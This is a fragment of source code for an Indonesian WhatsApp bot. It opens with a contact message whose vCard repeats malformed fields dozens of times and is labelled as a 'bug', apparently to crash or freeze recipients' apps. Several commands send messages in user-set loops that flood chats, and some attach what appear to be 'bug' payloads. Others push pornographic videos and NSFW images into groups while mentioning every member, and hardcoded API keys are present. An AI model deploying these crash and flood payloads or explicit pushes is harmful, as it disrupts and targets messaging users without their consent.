 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© banghw${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:banghw\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
haikal.sendContact(m.chat, global.ownerr, fkontaak)
}
}
break
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
haikal.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m})
}
}
break
//=================================================//
case 'banghwbokep': case 'banghwngentod': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted: doc })
}
}
break
//=================================================//
case 'banghwsange': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(m.chat, anuala, `banghw${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© banghw${buttonkal}`,
} 
haikal.sendMessage(m.chat, bugcrot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© © banghw${buttonkal}`,
} 
haikal.sendMessage(m.chat, bugahay, { quoted: m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'jadibug1': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//
case 'banghwhu': case 'banghw1': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 mem = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwhi': case 'banghw2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwha': case 'banghw3': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwhe': case 'banghw4': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwba': case 'banghw5': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ah = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwbe': case 'banghw6': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 eh = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwbu': case 'banghw7': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwbi': case 'banghw8': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwca': case 'banghw9': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwci': case 'banghw10': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ru = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwcu': case 'banghw11': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 re = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'banghwco': case 'banghw12': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'ban': case 'banned': {
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return m.reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return m.reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'banghw': case 'ikal': {
if (isBan) throw sticBanLu(from)
 hey = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngakak': {
if (isBan) throw sticBanLu(from)
 hiy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
 hoy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'awkwk': {
if (isBan) throw sticBanLu(from)
 huy = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
 mi = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
 miki = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'musik': {
if (isBan) throw sticBanLu(from)
 mo = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
 mu = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'banghw': {
if (isBan) throw sticBanLu(from)
 me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
 muku = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
 meke = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
 moko = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
case 'anime': {
if (isBan) throw sticBanLu(from) 
if (!text) return m.reply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
anu = await fetchJson(`https://api.jikan.moe/v4/anime?q=${text}`)
let sections = [] 
for (let i of anu.data) {
const list = {title: `${i.title}`,
rows: [
{
 title: `${i.title}`, 
 rowId: `${prefix}animee ${i.mal_id}`,
 description: `${i.synopsis}`
}, 
]
}
sections.push(list) 
}
const sendm =haikal.sendMessage(
 m.chat, 
 {
text: `*Search Results From* ${text}`,
footer: botname,
title: "*▊▊▊ANIME▊▊▊*",
buttonText: "CLICK HERE",
sections
 }, { quoted : m })
}
break
//=================================================//
case 'translate': case 'terjemahan': case 'tr': {
if (isBan) throw sticBanLu(from)
if (!args.join(" ")) return m.reply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw sticBanLu(from)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
haikal.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
case 'darkjoke':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
